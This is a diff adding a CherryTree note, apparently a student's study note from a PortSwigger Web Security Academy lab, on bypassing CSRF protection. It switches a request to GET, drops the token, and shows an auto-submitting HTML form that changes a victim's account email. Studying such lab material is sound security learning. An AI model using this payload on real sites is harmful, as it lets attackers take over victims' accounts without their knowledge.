@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="39" master_id="0" name="Request forrgery" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747569672" ts_lastsave="1747570212">
+    <rich_text>
+
+Find the request in burp
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Change request Method to get and remove csrf token:
+
+
+Build maliciouse script:
+
+
+</rich_text>
+    <codebox char_offset="0" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="html" highlight_brackets="1" show_line_numbers="0">
+For example if its only implemented for a GET request.
+
+GET /email/change?email=pwned@evil-user.net HTTP/1.1&#13;
+Host: vulnerable-website.com&#13;
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvL</codebox>
+    <encoded_png char_offset="28" justification="left" link="" sha256sum="fb9446707422c3cef32eb701662a7f493a916ffdd70fccd6d758b3eed8be26ce"/>
+    <encoded_png char_offset="83" justification="left" link="" sha256sum="5fb830e35f6e472b79216de6542c2bb451002416980b0f87a98b93c477d8e788"/>
+    <codebox char_offset="111" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="html" highlight_brackets="1" show_line_numbers="0">&lt;html&gt;&#13;
+    &lt;body&gt;&#13;
+        &lt;form action="https://0a1300ef0328eee38044bc04001800a3.web-security-academy.net/my-account/change-email?email=sdasd%40gmail.com" method="GET"&gt;&#13;
+            &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;&#13;
+        &lt;/form&gt;&#13;
+        &lt;script&gt;&#13;
+            document.forms[0].submit();&#13;
+        &lt;/script&gt;&#13;
+    &lt;/body&gt;&#13;
+&lt;/html&gt;</codebox>
+  </node>
+</cherrytree>
